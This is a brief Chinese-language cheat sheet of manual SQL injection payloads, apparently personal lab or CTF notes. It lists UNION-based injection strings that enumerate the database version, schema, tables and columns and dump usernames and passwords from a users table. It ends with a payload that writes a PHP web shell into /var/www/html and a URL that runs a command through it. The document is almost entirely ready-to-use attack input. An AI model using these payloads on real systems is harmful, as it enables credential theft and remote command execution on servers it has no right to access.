# SQL 手工注入小记

## 可能的报错点

- '
- "
- (
- )

## 测试过程

- 寻找长度

```
" or 1=1 -- -

" order by 3 -- -

" union select 1,2,3 -- -
```

-  记一次完整 SQL 手工注入语句

```
"

" or 1=1 -- -

" order by 3 -- -

" union select 1,2,3 -- -

" union select 1,2,version() -- -

" union select 1,2,database() -- -

" union select 1,2,user() -- -

" union select 1,2,TABLE_SCHEMA from INFORMATION_SCHEMA.tables -- -

" union select 1,2,table_name from INFORMATION_SCHEMA.tables -- -

" union select 1,2,column_name from INFORMATION_SCHEMA.columns where table_name='users' -- -

" union select 1,2,user from users -- -

" union select 1,2,pass from users -- -

" union select 1,2,position  from users -- -
```

- SQL 反弹 shell

```
SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php'

http://10.10.10.33/shell.php?cmd=pwd
```
